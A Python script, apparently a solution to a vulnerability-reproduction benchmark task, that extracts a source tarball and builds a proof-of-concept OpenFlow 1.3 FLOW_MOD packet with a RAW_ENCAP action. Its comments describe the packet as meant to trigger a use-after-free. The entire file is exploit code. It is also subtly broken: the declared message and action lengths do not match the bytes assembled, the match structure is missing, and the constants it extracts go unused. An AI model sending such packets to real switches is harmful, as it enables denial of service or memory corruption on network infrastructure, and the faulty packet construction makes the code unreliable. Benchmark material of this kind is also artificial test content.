import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball
        with tarfile.open(src_path, 'r:gz') as tar:
            extract_dir = tempfile.mkdtemp()
            tar.extractall(extract_dir)
        
        # Look for OpenFlow constants in headers
        ofp_constants = self._extract_ofp_constants(extract_dir)
        
        # Generate PoC based on vulnerability description
        # The PoC is an OpenFlow packet with RAW_ENCAP action
        # that triggers the use-after-free
        
        # Build OpenFlow header
        version = 0x04  # OpenFlow 1.3
        msg_type = 0x0d  # OFPT_FLOW_MOD
        length = 72  # Total message length
        xid = 0x00000001
        
        of_header = struct.pack('!BBHI', version, msg_type, length, xid)
        
        # Build flow mod message
        cookie = 0x0000000000000000
        cookie_mask = 0x0000000000000000
        table_id = 0x00
        command = 0x00  # OFPFC_ADD
        idle_timeout = 0x0000
        hard_timeout = 0x0000
        priority = 0x0000
        buffer_id = 0xffffffff
        out_port = 0x00000000
        out_group = 0x00000000
        flags = 0x0000
        pad = b'\x00\x00'
        
        flow_mod = struct.pack('!QQBBHHHIIHHxx',
                               cookie, cookie_mask, table_id, command,
                               idle_timeout, hard_timeout, priority,
                               buffer_id, out_port, out_group, flags)
        
        # Build RAW_ENCAP action
        # This is the key part that triggers the vulnerability
        action_header = struct.pack('!HH', 0xffff, 72 - 8 - 40)  # NXAST_RAW_ENCAP, length
        subtype = 0x0001  # NXAST_RAW_ENCAP
        pad = b'\x00\x00'
        
        # The encap data structure that will be freed and reallocated
        # We create a pattern that will trigger the reallocation
        encap_type = 0x0000
        encap_length = 56
        encap_data = b'A' * 56  # Large enough to trigger reallocation
        
        raw_encap_action = action_header + struct.pack('!H', subtype) + pad
        raw_encap_action += struct.pack('!HH', encap_type, encap_length)
        raw_encap_action += encap_data
        
        # Combine everything
        poc = of_header + flow_mod + raw_encap_action
        
        # Clean up
        import shutil
        shutil.rmtree(extract_dir)
        
        return poc
    
    def _extract_ofp_constants(self, extract_dir):
        # Helper to extract OpenFlow constants from headers
        constants = {}
        
        # Walk through extracted files
        for root, dirs, files in os.walk(extract_dir):
            for file in files:
                if file.endswith('.h'):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r') as f:
                            content = f.read()
                            # Look for NXAST_RAW_ENCAP constant
                            if 'NXAST_RAW_ENCAP' in content:
                                lines = content.split('\n')
                                for line in lines:
                                    if '#define NXAST_RAW_ENCAP' in line:
                                        parts = line.split()
                                        if len(parts) >= 3:
                                            constants['NXAST_RAW_ENCAP'] = int(parts[2], 0)
                    except:
                        continue
        
        return constants